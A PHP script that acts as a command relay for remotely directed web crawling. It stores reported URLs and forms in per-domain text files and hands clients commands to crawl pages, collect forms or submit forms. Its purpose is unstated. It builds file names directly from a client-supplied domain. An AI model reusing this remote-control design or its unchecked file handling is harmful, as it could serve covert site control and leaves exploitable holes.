<?php

/*

*/

function get_string_between($string, $start, $finish){
    $string = " ".$string;
    $position = strpos($string, $start);
    if ($position == 0) return "";
    $position += strlen($start);
    $length = strpos($string, $finish, $position) - $position;
    return substr($string, $position, $length);
}

function enread($filename,$start,$end){
	$get = false;
	$res = [];
	foreach(file($filename) as $line) {
		$line = trim($line);
		if ($line == $start){
			$get = true;
			continue;
		} 
		if ($line == $end) $get = false;
		if ($get && ($line !== "")) array_push($res, $line);
	}
	return $res;
}

function insert($file_target,$search,$update_string){
	$exist  = [];
	$unique = [];

	$exist = enread($file_target,"##URLS##","##FORMS##");
	$array_update = explode("|", base64_decode($update_string));
	foreach($array_update as $upd){
		if (!in_array($upd, $exist)) array_push($unique, $upd);
	}
	

	if($file=fopen($file_target,'r+'))
	{
		//echo 'File opened';
		$switch=0; //This variable will indicate whether the string has has been found.
		$back=0; //This counts the number of characters to move back after reaching eof.
	}
	
	while(!feof($file))
	{
		$string=fgets($file);
		if($switch==1)
		{
			$back+=strlen($string);
			$modstring=$modstring.$string;
		}
		if(strpos($string,$search)!==FALSE)
		{
			//echo 'String found';
			$switch=1;
			$string=fgets($file);
			//explode
			//$update_string = str_replace("|",PHP_EOL,$update_string);
			$add_string = implode(PHP_EOL,$unique);
			$modstring=$add_string.PHP_EOL.$string.PHP_EOL;
		
			$back+=strlen($string);
		}
	}
	$back*=-1;
	fseek($file,$back,SEEK_END);
	if (count($unique)>0) fwrite($file,$modstring);
	fclose($file);
}

function enread_forms($filename){
	$string = [];
	$string = enread($filename,"##FORMS##","##END##");
	$forms_per_urls = explode("#|#",$string[0]);
	$xurls = [];
	$urls = [];

	foreach($forms_per_urls as $fpu){
		$xurls = explode("|_|",$fpu);
		array_push($urls,$xurls[0]);
	}
	return $urls;
}



function insert_forms($file_target,$search,$update_string){
	$exist  = [];
	$unique = [];

	$exist = enread_forms($file_target);

	$update_string = base64_decode($update_string);

	$xurls = explode("|_|",$update_string);
	$urls = $xurls[0];

	//echo '$urls:'.$urls;

	$is_exist = false;

	foreach ($exist as $urlist) {
		if (strpos($urls, $urlist) !== FALSE) { 
	        $is_exist = true;
	    }
	}

	if ($is_exist == false) array_push($unique, $update_string);

	if($file=fopen($file_target,'r+'))
	{
		//echo 'File opened';
		$switch=0; //This variable will indicate whether the string has has been found.
		$back=0; //This counts the number of characters to move back after reaching eof.
	}
	
	while(!feof($file))
	{
		$string=fgets($file);
		if($switch==1)
		{
			$back+=strlen($string);
			$modstring=$modstring.$string;
		}
		if(strpos($string,$search)!==FALSE)
		{
			//echo 'String found';
			$switch=1;
			$string=fgets($file);
			$add_string = implode("#|#",$unique);
			$modstring=$add_string."#|#".$string.PHP_EOL;
		
			$back+=strlen($string);
		}
	}
	$back*=-1;
	fseek($file,$back,SEEK_END);
	if (count($unique)>0) fwrite($file,$modstring);
	fclose($file);
}

function cmd_write($filename,$cmd){
	$lines = file($filename);
	$lines[0] = $cmd.PHP_EOL;
	file_put_contents($filename, $lines);
}

function cmd_read($filename){
	$lines = file($filename);
	return($lines[0]);
}


if ((isset($_POST['id'])) AND (isset($_POST['domain']))) {
	$domain = $_POST['domain'];
	if(filter_var(gethostbyname($domain), FILTER_VALIDATE_IP)){
		$file = $domain.".txt";
		$id = $_POST['id'];
		switch ($id) {
		  case "1":
		    insert($file,'##URLS##',$_POST['urls']);
		    break;
		  case "2":
		    insert_forms($file,'##FORMS##',$_POST['urls']);
		    break;
		  default:
		    echo "0|OK";
		    cmd_write($file,"200");
		}
	}
} else {
	if (isset($_POST['domain'])){
		$domain = $_POST['domain'];
		if(filter_var(gethostbyname($domain), FILTER_VALIDATE_IP))
		{
			$file = $domain.".txt";
			if (file_exists($file)) {
				if (isset($_POST['en'])){
					if ($_POST['en'] == 'crawl_url'){
						cmd_write($file,"1".'|'.$_POST['page']);
					} elseif ($_POST['en'] == 'get_forms') {
						cmd_write($file,"2".'|'.$_POST['page']);
					} elseif ($_POST['en'] == 'submit_form') {
						cmd_write($file,"3".'|'.$_POST['page']);
					} elseif ($_POST['en'] == 'idle') {
						cmd_write($file,"200");
					} 
				} else {
					//read from 1 line command
					echo cmd_read($file);
				}
			} else {
				$fp = fopen($file, 'w') or die("Can't create file");
				fwrite($fp, '200'.PHP_EOL.'##URLS##'.PHP_EOL.'##FORMS##'.PHP_EOL.'##END##');
				fclose($fp);
				echo "0".'|init';
			}
		}
	}
}

?>